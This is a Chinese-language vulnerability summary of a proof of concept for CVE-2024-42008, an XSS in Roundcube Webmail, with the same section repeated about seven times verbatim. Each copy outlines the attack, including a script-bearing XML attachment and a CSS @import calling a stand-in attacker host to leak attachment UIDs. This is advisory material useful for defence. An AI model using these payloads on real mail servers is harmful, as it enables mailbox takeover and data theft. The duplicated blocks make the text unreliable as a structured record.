该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---



---

## POC #3

**来源**: [CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md](../2024/CVE-2024-42008-victoni_Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC.md)

## CVE-2024-42008 - Roundcube Cross-Site Scripting (XSS)

**漏洞编号:** CVE-2024-42008

**漏洞类型:** Cross-Site Scripting (XSS)

**影响应用:** Roundcube Webmail

**危害等级:** 高危，可能导致用户邮箱信息泄露、控制用户邮箱、发送恶意邮件等。

**影响版本:** 1.5.7 及 1.6.x 至 1.6.7

**利用条件:** 需要用户打开包含恶意附件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Roundcube Webmail的`rcmail_action_mail_get->run()`函数中。攻击者可以通过发送包含恶意XML附件的电子邮件，利用Content-Type header绕过XSS防御。附件中的JavaScript代码将在受害者的浏览器中执行，攻击者可利用该代码窃取用户cookie、会话信息，或者发送恶意邮件等。

**漏洞利用方式:**

1.  攻击者构造一个包含恶意XML附件的电子邮件。该XML文件包含嵌入的JavaScript代码，例如：
    ```xml
    <something:script xmlns:something="http://www.w3.org/1999/xhtml">
    	alert(origin)
    </something:script>
    ```
2.  攻击者发送此邮件给受害者。
3.  受害者打开该邮件，并点击查看附件。即使 Roundcube 禁用了“打开附件”选项，附件仍然可以通过特定的 URL 访问：`https://roundcube.host.com/?_task=mail&_mbox=INBOX&_uid=[UID]&_part=2&_download=0&_action=get`
4.  由于 Content-Type header 处理不当，附件中的JavaScript代码将在受害者的浏览器中执行。
5.  攻击者可以通过注入 CSS，配合一个 JavaScript 服务器端脚本，来提取恶意附件的 UID。
6.  CSS 注入通过在邮件正文中嵌入以下代码实现：
    ```css
    <style>
    	@import "//a.attackerdomain.com/start?"
    </style>
    ```
7.  JavaScript 服务器端脚本 (`roundcube-css-exploit.js`) 负责接收和处理 CSS 注入发起的请求，提取所需的信息。
8.  之后，攻击者可以使用窃取的UID构建恶意链接，或者发送包含恶意代码的第二封邮件来完成攻击。

**有效性评估:**

根据漏洞描述和提供的PoC代码，该漏洞是有效的。PoC展示了如何利用XML附件注入XSS，以及如何利用CSS注入提取有用的信息（例如附件UID）。搜索引擎结果也表明该漏洞已经公开并被广泛讨论。

**投毒风险评估:**

分析提供的 `roundcube-css-exploit.js` 代码，主要功能是接收 Roundcube 服务器发起的 CSS 注入请求，并从中提取信息。代码中包含一些域名和路径硬编码，例如 `/etc/letsencrypt/live/[a.attackerdomain.com]/` 和 `https://a.attackerdomain.com`。这些硬编码用于指定 SSL 证书路径和攻击者服务器的域名。虽然这些硬编码限制了代码的通用性，但也降低了直接的投毒风险，因为任何试图利用该代码的人都需要修改这些参数。总体来看，该PoC代码的投毒风险较低，为0%。

**项目地址:** [victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC](https://github.com/victoni/Roundcube-CVE-2024-42008-and-CVE-2024-42010-POC)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

